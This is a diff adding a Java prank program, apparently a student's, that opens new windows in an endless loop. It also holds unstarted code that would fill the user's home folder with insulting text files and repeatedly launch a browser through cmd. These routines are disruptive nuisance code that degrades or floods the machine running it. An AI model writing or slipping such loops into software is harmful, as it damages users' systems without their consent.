@@ -1,0 +1,96 @@
+import java.net.URL;
+import java.util.ArrayList;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.BufferedWriter;
+import java.io.IOException;
+import javax.swing.Icon;
+import javax.swing.ImageIcon;
+import javax.swing.JFrame;
+import javax.swing.JLabel;
+
+
+
+ public class Loop {
+	
+	public static void main(String[] args) throws InterruptedException {
+		Thread thread = new Thread(() -> {
+			for (long i = 0; i < Long.MAX_VALUE; i++) {
+				
+				System.out.println(i);
+				File newFile = new File(System.getProperty("user.home"), String.format("%d.txt", i));
+				BufferedWriter bw = null;
+				FileWriter fw = null;
+				
+				try {
+					String content ="You're an idiot habibti";
+										
+					fw = new FileWriter(newFile);
+					bw = new BufferedWriter(fw);
+					bw.write(content);
+					
+					System.out.println("Done");
+					
+				} catch (IOException e){
+					
+					e.printStackTrace();
+				} finally {
+					try{
+						if (bw != null)
+							bw.close();
+						
+						if (fw !=null)
+							fw.close();
+					} catch (IOException ex){
+						
+						ex.printStackTrace();
+					}
+				}
+			}
+		});
+		
+		//thread.start();
+	
+		Thread thread2 = new Thread(() -> {
+			while(true) {
+				JFrame frame = new JFrame();
+				frame.setLocationByPlatform(true);
+				frame.setSize(500, 500);
+				showLoader(frame);
+			}
+		});
+		thread2.start();
+	}	
+	public static void showLoader(JFrame frameLoader){
+        URL url = Loop.class.getResource("file:C:\\Users\\linus.olofsson1\\Desktop\\15Te-Linus.Olofsson\\Strukturer\\srccrazyfrogbrothers.gif");
+        Icon icon = new ImageIcon(url);
+        JLabel label = new JLabel(icon);
+        
+        frameLoader.pack();
+        frameLoader.getContentPane().add(label);
+        frameLoader.setLocationByPlatform(true);
+        frameLoader.getContentPane().add(label);
+        frameLoader.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frameLoader.pack();
+        frameLoader.setLocationRelativeTo(null);
+        frameLoader.setVisible(true);
+	// ta bort/ lägg till för modifering och test Thread.sleep(1000);
+	
+	};
+	
+	
+	
+	Thread thread3 = new Thread(() -> {
+		
+		while(true)
+		try {
+			Runtime.getRuntime().exec("cmd /c start https://www.youtube.com/watch?v=IRjJRTLlKy8");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
+	});
+	
+}
+// Bara för jag kan
